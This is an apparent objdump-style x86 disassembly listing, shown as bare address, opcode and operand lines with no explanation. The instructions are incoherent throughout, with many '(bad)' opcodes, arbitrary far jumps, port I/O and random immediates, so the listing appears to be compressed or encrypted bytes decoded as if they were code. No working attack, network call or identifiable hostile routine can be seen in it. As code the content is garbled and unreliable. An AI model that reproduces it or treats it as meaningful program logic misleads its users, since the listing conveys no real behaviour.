  427b07:	sti    
  427b08:	ret    
  427b09:	jmp    0xbbdb:0x9763c114
  427b10:	imul   eax,DWORD PTR [eax],0x0
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	neg    BYTE PTR [edi+0x1e]
  427b82:	mov    ds:0x1a8fb49,eax
  427b87:	add    BYTE PTR ds:0x2b000001,al
  427b8d:	std    
  427b8e:	add    al,0xfa
  427b90:	sub    DWORD PTR [esi],edx
  427b92:	xchg   BYTE PTR [esi-0x3d59c155],ch
  427b98:	pop    edx
  427b99:	iret   
  427b9a:	aaa    
  427b9b:	jne    0x427b5f
  427b9d:	xlat   BYTE PTR ds:[ebx]
  427b9e:	ror    ebx,1
  427ba0:	push   esi
  427ba1:	lahf   
  427ba2:	push   eax
  427ba3:	cmp    DWORD PTR ds:0x3389b76b,ebp
  427ba9:	cmp    al,0xf1
  427bab:	sub    DWORD PTR [edx+0x23],ecx
  427bae:	adc    esi,eax
  427bb0:	jge    0x427bc1
  427bb2:	pushf  
  427bb3:	mov    cl,0xba
  427bb5:	cdq    
  427bb6:	dec    edi
  427bb7:	sar    BYTE PTR [edx+esi*2-0x51],cl
  427bbb:	inc    eax
  427bbc:	cmp    ebp,DWORD PTR [edx-0x26]
  427bbf:	icebp  
  427bc0:	popf   
  427bc1:	fstp   QWORD PTR [ecx]
  427bc3:	push   cs
  427bc4:	inc    eax
  427bc5:	add    BYTE PTR [ebp-0x7dcce99b],cl
  427bcb:	lahf   
  427bcc:	sbb    BYTE PTR [ecx],dl
  427bce:	(bad)  
  427bd0:	add    bl,dh
  427bd2:	ficom  WORD PTR [edx-0x7f]
  427bd5:	mov    cl,0x3b
  427bd7:	loope  0x427bde
  427bd9:	js     0x427bc5
  427bdb:	idiv   DWORD PTR [ebp+0x2122ab]
  427be1:	push   cs
  427be2:	(bad)  
  427be3:	jmp    0x427c3c
  427be5:	push   es
  427be6:	fisttp WORD PTR [edx]
  427be8:	(bad)  
  427be9:	in     eax,0x79
  427beb:	ficom  DWORD PTR [edi]
  427bed:	std    
  427bee:	or     edi,DWORD PTR [esi-0x40d58e9a]
  427bf4:	xchg   ebx,eax
  427bf5:	jg     0x427c24
  427bf7:	arpl   WORD PTR [ebx-0x18],si
  427bfa:	jg     0x427c2e
  427bfc:	dec    esp
  427bfd:	retf   0x89fd
  427c00:	push   esp
  427c01:	inc    edx
  427c02:	retf   0x6ede
  427c05:	das    
  427c06:	dec    edi
  427c07:	push   ebx
  427c08:	sbb    dh,bl
  427c0a:	scas   al,BYTE PTR es:[edi]
  427c0b:	add    ah,BYTE PTR [eax+0x6700a6a2]
  427c11:	test   al,0x49
  427c13:	dec    esi
  427c14:	xchg   ebx,eax
  427c15:	adc    DWORD PTR [esi],eax
  427c17:	xchg   ebp,eax
  427c18:	test   bl,al
  427c1a:	repnz mov eax,0x1a0af1fd
  427c20:	xchg   bh,bl
  427c22:	or     BYTE PTR [esi+eiz*1],ah
  427c25:	jl     0x427c12
  427c27:	adc    eax,0x64608c23
  427c2c:	jns    0x427bfc
  427c2e:	xor    ebx,edi
  427c30:	fnstcw WORD PTR [edi]
  427c32:	fmul   QWORD PTR [edx-0x721204ce]
  427c38:	pop    esp
  427c39:	cli    
  427c3a:	dec    edx
  427c3b:	or     eax,0x4eae497d
  427c40:	(bad)  
  427c41:	ss cmc 
  427c43:	ret    
  427c44:	or     bh,ch
  427c46:	(bad)  
  427c47:	ins    BYTE PTR es:[edi],dx
  427c48:	shl    DWORD PTR [eax],1
  427c4a:	rcr    ecx,1
  427c4c:	out    dx,eax
  427c4d:	lea    ecx,[esi]
  427c4f:	fisttp WORD PTR [edx]
  427c51:	sbb    bl,al
  427c53:	ret    
  427c54:	pushf  
  427c55:	sbb    ah,bh
  427c57:	mov    BYTE PTR [edx+edx*4+0x64],ah
  427c5b:	inc    edi
  427c5c:	fldenv [edi-0x24]
  427c5f:	ss cmp esp,0x18
  427c63:	int3   
  427c64:	pop    ebx
  427c65:	loope  0x427c51
  427c67:	add    DWORD PTR [ebx-0x31],esi
  427c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c6b:	shl    DWORD PTR [edx],cl
  427c6d:	aad    0xc5
  427c6f:	and    BYTE PTR [eax],bh
  427c71:	retf   0x89f2
  427c74:	in     al,dx
  427c75:	fsub   QWORD PTR [edx+0x7e3ef807]
  427c7b:	inc    ebp
  427c7c:	dec    esp
  427c7d:	push   edi
  427c7e:	repz in al,0x49
  427c81:	adc    edi,esp
  427c83:	pop    ebx
  427c84:	adc    BYTE PTR [ebx+0x392a9904],dl
  427c8a:	lods   al,BYTE PTR ds:[esi]
  427c8b:	sbb    DWORD PTR [edx],edi
  427c8d:	mov    ah,0x4b
  427c8f:	cld    
  427c90:	mov    bh,0x0
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x71c55d44,ebx
  427d02:	out    0xd4,eax
  427d04:	add    BYTE PTR [edx+0x1050001],ch
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	push   edx
  427d0d:	mov    ah,BYTE PTR ds:0xa562ab57
  427d13:	xchg   ebx,eax
  427d14:	ret    0xcbc9
  427d17:	out    0x3d,al
  427d19:	mov    edx,0xc51113b0
  427d1e:	pop    edi
  427d1f:	pop    es
  427d20:	push   edx
  427d21:	mov    ebp,0x6885f31a
  427d26:	test   DWORD PTR [eax],edi
  427d28:	jbe    0x427d7a
  427d2a:	cmp    edx,ebx
  427d2c:	shr    DWORD PTR [edi],1
  427d2e:	fsubr  DWORD PTR [ebp-0x3a]
  427d31:	rcr    DWORD PTR [eax],1
  427d33:	pop    ecx
  427d34:	sysenter 
  427d36:	push   cs
  427d37:	mov    dl,ah
  427d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d3a:	xor    eax,0x5c43bdae
  427d3f:	cmp    edx,DWORD PTR [edx]
  427d41:	mov    bl,BYTE PTR [ebx-0x58]
  427d44:	mov    esi,0x99222eee
  427d49:	mov    bl,0x68
  427d4b:	and    dl,ah
  427d4d:	mov    esi,0xe1a36be1
  427d52:	in     al,0x12
  427d54:	nop
  427d55:	inc    ebx
  427d56:	scas   al,BYTE PTR es:[edi]
  427d57:	xchg   ecx,eax
  427d58:	dec    ecx
  427d59:	inc    ecx
  427d5a:	adc    eax,0xd7b5d26d
  427d5f:	pop    ss
  427d60:	inc    edi
  427d61:	out    0xbf,al
  427d63:	cmp    cl,BYTE PTR [eax+esi*1-0x3820003d]
  427d6a:	sbb    BYTE PTR [edx-0x4010a6ed],ch
  427d70:	(bad)  
  427d71:	mov    edx,0x9257b726
  427d76:	xchg   esi,eax
  427d77:	(bad)  [ebx-0x66e71be2]
  427d7d:	pop    ebx
  427d7e:	push   ebx
  427d7f:	push   eax
  427d80:	out    0xaa,al
  427d82:	and    ebp,DWORD PTR [eax]
  427d84:	rol    bh,1
  427d86:	outs   dx,DWORD PTR ds:[esi]
  427d87:	(bad)
  427d8c:	clc    
  427d8d:	lahf   
  427d8e:	dec    ebx
  427d8f:	mov    eax,0x3674d61d
  427d94:	mov    cl,0x46
  427d96:	cmp    edi,DWORD PTR [edx-0x3df24444]
  427d9c:	xlat   BYTE PTR ds:[ebx]
  427d9d:	test   BYTE PTR [ebp+0x130f8beb],al
  427da3:	outs   dx,DWORD PTR ds:[esi]
  427da4:	or     edi,DWORD PTR [edx-0x76a68e82]
  427daa:	xchg   ebp,eax
  427dab:	mov    ch,BYTE PTR [esi]
  427dad:	in     eax,dx
  427dae:	aam    0xbd
  427db0:	mov    esi,0x43e6f2cc
  427db5:	mov    ah,0xaf
  427db7:	xor    DWORD PTR [ecx+0x738aa9a9],ebp
  427dbd:	adc    edi,esp
  427dbf:	xor    al,0x9d
  427dc1:	cmp    ebp,eax
  427dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dc4:	dec    edx
  427dc5:	rcr    ebx,cl
  427dc7:	add    DWORD PTR [eax+0x52],eax
  427dca:	cld    
  427dcb:	or     eax,0x5a283db1
  427dd0:	xchg   edi,eax
  427dd1:	adc    al,0xae
  427dd3:	mov    ?,WORD PTR [ebx-0x7f]
  427dd6:	stos   BYTE PTR es:[edi],al
  427dd7:	in     al,0x5b
  427dd9:	mov    dl,0xc2
  427ddb:	jns    0x427d8c
  427ddd:	ficomp WORD PTR [edi]
  427ddf:	and    al,0x4a
  427de1:	mov    bl,0xe1
  427de3:	stc    
  427de4:	into   
  427de5:	fisttp WORD PTR [ebx-0x22]
  427de8:	push   edi
  427de9:	data16 jno 0x427de3
  427dec:	push   eax
  427ded:	push   ds
  427dee:	push   0xffffffaa
  427df0:	stos   BYTE PTR es:[edi],al
  427df1:	jmp    0x611:0xc56144ae
  427df8:	sub    eax,0x9347e4c
  427dfd:	pop    ebx
  427dfe:	adc    DWORD PTR [edx-0x686eb7aa],ebx
  427e04:	mov    eax,0x6c0668d1
  427e09:	out    dx,al
  427e0a:	in     al,dx
  427e0b:	data16 cli 
  427e0d:	sbb    DWORD PTR [ecx+0x851c],edx
	...
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	rol    dh,1
  427e82:	cmp    BYTE PTR [ebp+0x1ab05],cl
  427e88:	add    eax,0x6d000001
  427e8d:	sbb    eax,0x42133519
  427e92:	addr16 push 0x37
  427e95:	and    cl,BYTE PTR [ecx+0xb9fe24b]
  427e9b:	xchg   BYTE PTR [esi+0x490eaf07],cl
  427ea1:	call   0x77b4cca8
  427ea6:	xchg   edx,eax
  427ea7:	pop    ss
  427ea8:	lds    edx,FWORD PTR [eax+0x47343bb9]
  427eae:	out    dx,eax
  427eaf:	sbb    eax,0xd7e8fb72
  427eb4:	xchg   esp,eax
  427eb5:	mov    cl,0x9b
  427eb7:	sahf   
  427eb8:	cmc    
  427eb9:	push   ebp
  427eba:	imul   ecx
  427ebc:	push   es
  427ebd:	fsub   QWORD PTR [eax+0x1f10dbb3]
  427ec3:	mov    ebp,0xfc4ae950
  427ec8:	(bad)  
  427ec9:	mov    DWORD PTR [ecx+0x18befaf9],ebp
  427ecf:	and    ebp,esi
  427ed1:	repz loope 0x427ef5
  427ed4:	mov    BYTE PTR [ecx-0x38db35d],ah
  427eda:	rol    dl,0xcd
  427edd:	fcom   QWORD PTR [eax+0x1edb7fcc]
  427ee3:	xor    ecx,DWORD PTR [ecx*1-0x5da9bef2]
  427eea:	mov    edi,0x566809a7
  427eef:	in     eax,0x70
  427ef1:	push   ds
  427ef2:	dec    ebx
  427ef3:	dec    edx
  427ef4:	jae    0x427f4b
  427ef6:	mov    ebx,0x12f34191
  427efb:	ret    
  427efc:	das    
  427efd:	lea    esp,[ecx-0x55c62c79]
  427f03:	fld    TBYTE PTR [eax-0x4dc93eb7]
  427f09:	mov    eax,0xf53f36fe
  427f0e:	jb     0x427ecc
  427f10:	jmp    0x8c09e2d3
  427f15:	inc    esp
  427f16:	ins    BYTE PTR es:[edi],dx
  427f17:	in     al,dx
  427f18:	jnp    0x427ed0
  427f1a:	iret   
  427f1b:	out    dx,al
  427f1c:	loop   0x427f25
  427f1e:	ror    BYTE PTR [eax+0x109830ce],0x49
  427f25:	xor    al,0x1
  427f27:	ficomp WORD PTR [edi+0x72]
  427f2a:	ja     0x427fa4
  427f2c:	dec    esi
  427f2d:	sahf   
  427f2e:	xor    DWORD PTR [ebx+0x7572a700],edx
  427f34:	arpl   WORD PTR [ecx-0x25],sp
  427f37:	pop    es
  427f38:	mov    ?,WORD PTR [ecx-0xe]
  427f3b:	push   edi
  427f3c:	cld    
  427f3d:	mov    ds:0x2d4bdc63,al
  427f42:	jmp    0x1acb:0xe446a3ab
  427f49:	ss or  eax,0xb836aef8
  427f4f:	inc    edi
  427f50:	sar    DWORD PTR [ebx+ecx*1+0x35248eae],0xb
  427f58:	add    esi,ebp
  427f5a:	jl     0x427f8b
  427f5c:	and    DWORD PTR [esi+0x20],0x47
  427f60:	(bad)  
  427f63:	dec    ecx
  427f64:	or     DWORD PTR [eax-0x59998d0f],eax
  427f6a:	call   0xbde6649c
  427f6f:	clc    
  427f70:	repz test BYTE PTR [esi+ebx*1-0x692f3efa],ah
  427f78:	mov    bl,0xdd
  427f7a:	jbe    0x427f8d
  427f7c:	call   0x64c:0xf81dedbe
  427f83:	jl     0x427f80
  427f85:	les    ebx,FWORD PTR [ebp-0x3]
  427f88:	shl    DWORD PTR cs:[edi-0xc],1
  427f8c:	mov    ebx,0x9e05b301
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	xor    ebx,DWORD PTR [ebp-0x53f59140]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0x1e000001
  42800d:	mov    ds:0x1c94db6b,eax
  428012:	adc    ah,BYTE PTR [edx+0x77853137]
  428018:	sub    eax,0xb4351474
  42801d:	out    dx,eax
  42801e:	jl     0x427fcb
  428020:	retf   0x4e1
  428023:	js     0x428082
  428025:	pop    es
  428026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428027:	sub    BYTE PTR [ebp-0x62],0x75
  42802b:	mov    esi,0xf1e38406
  428030:	sub    BYTE PTR [edx+ebp*8-0x80],ch
  428034:	jns    0x427fec
  428036:	dec    esi
  428037:	or     ecx,eax
  428039:	pop    eax
  42803a:	push   esi
  42803b:	lea    ebx,[eax+0x78]
  42803e:	je     0x427fef
  428040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428041:	pop    edi
  428042:	and    eax,0x3389b1e0
  428047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428048:	sub    ah,al
  42804a:	pushf  
  42804b:	imul   ecx,edx,0x9339cf7b
  428051:	mov    esp,0x78a0bb0e
  428056:	in     al,0x31
  428058:	xor    ebx,eax
  42805a:	mov    bl,0xbb
  42805c:	pop    edx
  42805d:	push   es
  42805e:	mov    ds,ebx
  428060:	xchg   esi,eax
  428061:	out    dx,al
  428062:	jo     0x4280bc
  428064:	sub    cl,al
  428066:	adc    eax,0x9748ccc5
  42806b:	pop    edx
  42806c:	jl     0x428040
  42806e:	je     0x42803b
  428070:	add    al,0x24
  428072:	arpl   bp,dx
  428074:	clc    
  428075:	add    ebx,DWORD PTR [ecx]
  428077:	int    0x9f
  428079:	retf   0x24c6
  42807c:	repnz mov ah,0xf5
  42807f:	push   ebx
  428080:	pop    ebx
  428081:	cli    
  428082:	int3   
  428083:	cli    
  428084:	xchg   edi,eax
  428085:	sub    cl,dh
  428087:	retf   
  428088:	ja     0x4280c4
  42808a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42808b:	loop   0x428071
  42808d:	test   eax,0xb627d0da
  428092:	sar    cl,cl
  428094:	cld    
  428095:	xor    ch,BYTE PTR [ecx]
  428097:	adc    eax,0x32db0c2e
  42809c:	sbb    al,BYTE PTR [ebx-0x5a]
  42809f:	jnp    0x42803e
  4280a1:	test   al,0x6a
  4280a3:	dec    ebx
  4280a4:	mov    ecx,0x92eb15c8
  4280a9:	and    eax,0xf220ccdc
  4280ae:	jmp    DWORD PTR [ecx]
  4280b0:	push   ss
  4280b1:	popa   
  4280b2:	ret    0x9712
  4280b5:	das    
  4280b6:	and    al,0xf
  4280b8:	dec    eax
  4280b9:	dec    esi
  4280ba:	jle    0x42813a
  4280bc:	pop    edi
  4280bd:	outs   dx,DWORD PTR ds:[esi]
  4280be:	pop    ax
  4280c0:	mov    ds:0xa1bc4d44,eax
  4280c5:	aam    0x41
  4280c7:	cmp    DWORD PTR [edi],ebp
  4280c9:	bswap  edx
  4280cb:	pop    es
  4280cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280cd:	xor    ebx,edi
  4280cf:	cmc    
  4280d0:	fisttp QWORD PTR [esi+0x45]
  4280d3:	pop    ecx
  4280d4:	mov    edi,0x239065cd
  4280d9:	fimul  DWORD PTR [ebx+0x24f884a3]
  4280df:	je     0x42811f
  4280e1:	or     dl,BYTE PTR [ecx+0x46]
  4280e4:	sub    BYTE PTR [ecx+0x2d6de5b3],al
  4280ea:	das    
  4280eb:	push   cs
  4280ec:	jns    0x42811f
  4280ee:	test   BYTE PTR [edx+0x5a],bl
  4280f1:	mov    es,WORD PTR [edx+0x23]
  4280f4:	xchg   DWORD PTR [ecx-0x6f],esp
  4280f7:	adc    ecx,0x35
  4280fa:	lea    eax,[edx+0x27]
  4280fd:	fnstenv [esi]
  4280ff:	ret    0x399
  428102:	cs dec ebp
  428104:	mov    dl,0xcc
  428106:	clc    
  428107:	mov    edx,DWORD PTR [edi-0x1519f80]
  42810d:	push   esp
  42810e:	jnp    0x4280d5
  428110:	lea    eax,[eax]
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	test   DWORD PTR [edx-0x52f088f8],esi
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0x1f000001
  42818d:	arpl   WORD PTR [ecx],bp
  42818f:	rcl    BYTE PTR [eax-0x65],0x97
  428193:	xor    DWORD PTR [edx],0x771ca6f1
  428199:	in     al,0x1e
  42819b:	test   eax,0x32ba98f3
  4281a0:	adc    DWORD PTR ds:0x36c9a5a2,0xa4bdff19
  4281aa:	cli    
  4281ab:	sar    DWORD PTR [ebx-0x7f],1
  4281ae:	or     cl,ah
  4281b0:	add    al,0x5a
  4281b2:	push   ecx
  4281b3:	sbb    BYTE PTR [ebx+0x5ed3e6a],bh
  4281b9:	jno    0x428218
  4281bb:	push   ds
  4281bc:	in     al,dx
  4281bd:	and    al,BYTE PTR [bx+di+0x1858]
  4281c2:	lea    esp,[edx-0x4b]
  4281c5:	sub    eax,0x212900d4
  4281ca:	inc    esp
  4281cb:	and    DWORD PTR [ebp+0x362b3f49],esp
  4281d1:	mov    ecx,fs
  4281d3:	mov    BYTE PTR [edi+0x5b],cl
  4281d6:	shr    BYTE PTR [edi-0x3],0x63
  4281da:	push   esp
  4281db:	jb     0x42815d
  4281dd:	outs   dx,DWORD PTR ds:[esi]
  4281de:	aam    0xfa
  4281e0:	inc    eax
  4281e1:	sub    edx,ebp
  4281e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281e4:	mul    esp
  4281e6:	out    dx,eax
  4281e7:	das    
  4281e8:	xchg   DWORD PTR [ecx+0x6c452555],edx
  4281ee:	std    
  4281ef:	in     eax,dx
  4281f0:	push   ds
  4281f1:	and    eax,0x4c222bfe
  4281f6:	add    ah,BYTE PTR [ecx]
  4281f8:	mov    bl,dl
  4281fa:	xchg   ebx,eax
  4281fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281fc:	add    al,dh
  4281fe:	cmp    edx,DWORD PTR [esi-0x4e]
  428201:	in     al,0xf0
  428203:	mov    ds:0xaf5fc57c,al
  428208:	sahf   
  428209:	push   ds
  42820a:	cdq    
  42820b:	mov    bl,0x5
  42820d:	sub    al,BYTE PTR [ebx]
  42820f:	retf   0x82c7
  428212:	pushf  
  428213:	add    BYTE PTR [edx-0x29],ch
  428216:	cwde   
  428217:	(bad)  
  428218:	cld    
  428219:	or     eax,0x6843d87a
  42821e:	or     DWORD PTR [ebx],ebp
  428220:	bound  ebx,QWORD PTR [edx+0x16]
  428223:	aaa    
  428224:	imul   ecx,eax,0x1e45eea8
  42822a:	scas   al,BYTE PTR es:[edi]
  42822b:	mov    ds:0x58fc2a25,al
  428230:	ja     0x42827b
  428232:	adc    ebp,DWORD PTR [eax]
  428234:	mov    bh,0x7e
  428236:	and    al,al
  428238:	or     DWORD PTR [ebp+0x35],ecx
  42823b:	cdq    
  42823c:	cmc    
  42823d:	ret    
  42823e:	(bad)  
  42823f:	sti    
  428240:	aaa    
  428241:	test   eax,0x39bd2389
  428246:	inc    esi
  428247:	sub    ch,al
  428249:	sbb    al,0xbe
  42824b:	sub    eax,0x85f26b3b
  428250:	xor    al,0xca
  428252:	ja     0x428207
  428254:	fbstp  TBYTE PTR [ecx]
  428256:	cmp    ecx,ecx
  428258:	fsub   DWORD PTR [edx-0xf]
  42825b:	jno    0x428242
  42825d:	xchg   ebp,eax
  42825e:	in     eax,dx
  42825f:	mov    ds:0x8c9e456f,eax
  428264:	jno    0x4282d0
  428266:	cs xchg ebx,eax
  428268:	out    dx,eax
  428269:	inc    edi
  42826a:	sub    eax,0x4f52a0a0
  42826f:	mov    bl,0x4
  428271:	repnz cmp dh,BYTE PTR [esi+0x3f769796]
  428278:	xchg   esp,eax
  428279:	(bad)  
  42827b:	in     eax,dx
  42827c:	ja     0x4282c6
  42827e:	pop    es
  42827f:	mov    ds:0x4394c0bd,al
  428284:	ret    0xa4c5
  428287:	mov    al,0x51
  428289:	jae    0x4282c0
  42828b:	add    bh,ah
  42828d:	dec    ecx
  42828e:	fadd   DWORD PTR [edi+0x62]
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	xchg   ch,al
  428302:	dec    ecx
  428303:	sub    edx,DWORD PTR [esi+ebp*4]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0xbd000001
  42830d:	mov    dl,0x80
  42830f:	outs   dx,BYTE PTR ds:[esi]
  428310:	mov    BYTE PTR [ecx],bh
  428312:	jge    0x42830e
  428314:	and    DWORD PTR [ebx-0x18],0x7f
  428318:	or     edx,ecx
  42831a:	mov    al,ds:0x570cb69b
  42831f:	mov    ?,WORD PTR [edx-0x2a]
  428322:	outs   dx,DWORD PTR ds:[esi]
  428323:	sub    al,0x82
  428325:	mov    ebx,DWORD PTR [edi-0x5611da9d]
  42832b:	sub    bl,BYTE PTR [ebp+0x78]
  42832e:	dec    esi
  42832f:	pop    ss
  428330:	lods   al,BYTE PTR ds:[esi]
  428331:	fs jae 0x4282eb
  428334:	je     0x428383
  428336:	imul   esp,DWORD PTR [esi],0x58759f50
  42833c:	push   esi
  42833d:	mov    ah,0xbb
  42833f:	jo     0x42833c
  428341:	fwait
  428342:	xchg   esp,eax
  428343:	aam    0xba
  428345:	call   0xec2b:0xee71ebb7
  42834c:	test   al,0xd9
  42834e:	pop    esp
  42834f:	ror    cl,1
  428351:	pop    eax
  428352:	scas   al,BYTE PTR es:[edi]
  428353:	call   0x845f:0xf93ad44e
  42835a:	ds addr16 dec eax
  42835d:	int    0xf8
  42835f:	leave  
  428360:	lea    ebx,[edx+edi*4]
  428363:	dec    ebx
  428364:	test   eax,0xa1722827
  428369:	sub    eax,0x5be5024
  42836e:	(bad)  [esi-0x6b]
  428371:	mov    edi,0xa07bbb06
  428376:	or     esp,DWORD PTR [edi-0x355ff33a]
  42837c:	cmp    DWORD PTR [eax],eax
  42837e:	(bad)  
  42837f:	in     eax,0xd1
  428381:	xchg   DWORD PTR [ecx-0x1d],ebx
  428384:	sahf   
  428385:	xor    al,0x39
  428387:	sub    al,0x1
  428389:	ins    DWORD PTR es:[edi],dx
  42838a:	xchg   esi,eax
  42838b:	mov    ebp,0x4496d393
  428390:	pop    ds
  428391:	(bad)  
  428392:	fs mov cl,0xda
  428395:	lods   al,BYTE PTR ds:[esi]
  428396:	mov    cl,0x24
  428398:	and    eax,0xa9ecfac8
  42839d:	mov    esp,0x478bc6a1
  4283a2:	jnp    0x428395
  4283a4:	jmp    0x35d6733d
  4283a9:	test   BYTE PTR ds:0xa0e1037b,0xfa
  4283b0:	adc    ebx,DWORD PTR [eax-0x3d]
  4283b3:	pop    edx
  4283b4:	into   
  4283b5:	out    dx,eax
  4283b6:	shl    BYTE PTR [edx+0x8],1
  4283b9:	mov    ebx,0x32c1f2e8
  4283be:	add    eax,eax
  4283c0:	jl     0x4283cf
  4283c2:	pop    ebp
  4283c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283c4:	add    eax,0x68d11684
  4283c9:	scas   al,BYTE PTR es:[edi]
  4283ca:	xchg   ah,bh
  4283cc:	test   DWORD PTR [ecx],esi
  4283ce:	adc    BYTE PTR [edx+0x23],bh
  4283d1:	nop
  4283d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283d3:	xchg   edi,eax
  4283d4:	lds    esi,FWORD PTR [edx+0xd]
  4283d7:	and    BYTE PTR [edi],bl
  4283d9:	mov    ecx,0x4d35fdd7
  4283de:	cli    
  4283df:	dec    edi
  4283e0:	stos   DWORD PTR es:[edi],eax
  4283e1:	repnz es dec esp
  4283e4:	aaa    
  4283e5:	test   DWORD PTR [ebp-0x66],esp
  4283e8:	add    al,0xbd
  4283ea:	push   esi
  4283eb:	cmp    ebp,esi
  4283ed:	hlt    
  4283ee:	and    eax,0xa1c24e7d
  4283f3:	sub    dh,bh
  4283f5:	mov    dl,0xf5
  4283f7:	add    DWORD PTR [esi+0x5707f3eb],edi
  4283fd:	loope  0x428471
  4283ff:	push   edx
  428400:	test   dh,bh
  428402:	xchg   ecx,eax
  428403:	mov    ?,WORD PTR [ebx-0x38]
  428406:	cwde   
  428407:	dec    ecx
  428408:	sub    al,0xbb
  42840a:	xor    bl,BYTE PTR [eax-0x6babac3c]
  428410:	mov    ds:0x0,eax
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x3babfb32
  428481:	mov    esi,0xaf1952e6
  428486:	add    DWORD PTR [eax],eax
  428488:	add    eax,0x4c000001
  42848d:	pop    ds
  42848e:	(bad)  
  428490:	out    dx,eax
  428491:	push   es
  428492:	aam    0x1f
  428494:	test   eax,0x9bf39017
  428499:	xor    al,BYTE PTR [ebx+0x5e]
  42849c:	cs mov al,0xc2
  42849f:	mov    ch,0x1c
  4284a1:	inc    eax
  4284a2:	adc    al,0xce
  4284a4:	out    0x8e,eax
  4284a6:	adc    eax,0xfef1993f
  4284ab:	adc    eax,0x71bbe975
  4284b0:	ss dec ecx
  4284b2:	jae    0x42852a
  4284b4:	dec    eax
  4284b5:	cmp    al,0x75
  4284b7:	mov    ah,bl
  4284b9:	mov    ds:0x4125017,eax
  4284be:	xchg   ecx,eax
  4284bf:	push   esi
  4284c0:	adc    eax,0x6066e184
  4284c5:	mov    cl,0xe
  4284c7:	ja     0x4284ce
  4284c9:	sub    DWORD PTR [esi+0x1456c37f],ebp
  4284cf:	push   ebx
  4284d0:	dec    eax
  4284d1:	scas   al,BYTE PTR es:[edi]
  4284d2:	add    edx,DWORD PTR [edi]
  4284d4:	mov    dh,0x32
  4284d6:	inc    DWORD PTR [eax-0x67]
  4284d9:	jle    0x428535
  4284db:	fbld   TBYTE PTR [ecx]
  4284dd:	test   al,0xb1
  4284e0:	ss jg  0x4284e0
  4284e3:	cmp    esp,eax
  4284e5:	xchg   ebp,eax
  4284e6:	pop    edx
  4284e7:	inc    ecx
  4284e8:	inc    eax
  4284ea:	out    0x81,al
  4284ec:	mov    ah,0x67
  4284ee:	test   edi,ebp
  4284f0:	adc    BYTE PTR [eax+ecx*1],cl
  4284f3:	(bad)  
  4284f4:	out    dx,eax
  4284f5:	out    0xb3,al
  4284f7:	xchg   esi,eax
  4284f8:	cdq    
  4284f9:	shr    DWORD PTR [edx],1
  4284fb:	stc    
  4284fc:	xor    BYTE PTR ds:0x4912ea91,cl
  428502:	cli    
  428503:	repz fwait
  428505:	mov    dh,0x2b
  428507:	jo     0x428520
  428509:	and    DWORD PTR cs:[ebp-0x3c],edx
  42850d:	mov    eax,ds:0xd88c6654
  428512:	pop    ds
  428513:	mov    al,0xd9
  428515:	(bad)  
  428516:	ss push ecx
  428518:	dec    ebp
  428519:	and    ebx,DWORD PTR [edi-0x44]
  42851c:	mov    dl,0x25
  42851e:	sub    DWORD PTR [ebp+eiz*4+0x5ce85a46],esi
  428525:	addr16 aaa 
  428527:	cbw    
  428529:	jge    0x42853c
  42852b:	into   
  42852c:	pop    esi
  42852d:	inc    ebp
  42852e:	inc    edx
  42852f:	mov    WORD PTR [edi],ss
  428531:	pop    ecx
  428532:	loopne 0x428512
  428534:	int3   
  428535:	lahf   
  428536:	xchg   ecx,eax
  428537:	in     al,dx
  428538:	cmp    al,0x3a
  42853a:	mov    ah,0xf6
  42853c:	out    0x5d,eax
  42853e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42853f:	stc    
  428540:	fwait
  428541:	ret    0x6aad
  428544:	out    dx,al
  428545:	cmp    DWORD PTR [ebx-0x3a],ecx
  428548:	lock inc ecx
  42854a:	jmp    0x4285c6
  42854c:	cmp    eax,0x16a0d97d
  428551:	mov    cl,0xc5
  428553:	dec    eax
  428554:	(bad)  
  428556:	jl     0x42857e
  428558:	dec    ecx
  428559:	mov    ecx,0x8796d006
  42855e:	inc    ebp
  42855f:	in     eax,dx
  428560:	xchg   esi,eax
  428561:	out    0xe3,eax
  428563:	sub    al,0x5f
  428565:	cmp    DWORD PTR [edx+edx*1-0x5],edx
  428569:	mov    esi,0xd67ecdcf
  42856e:	push   esp
  42856f:	mov    cl,0x0
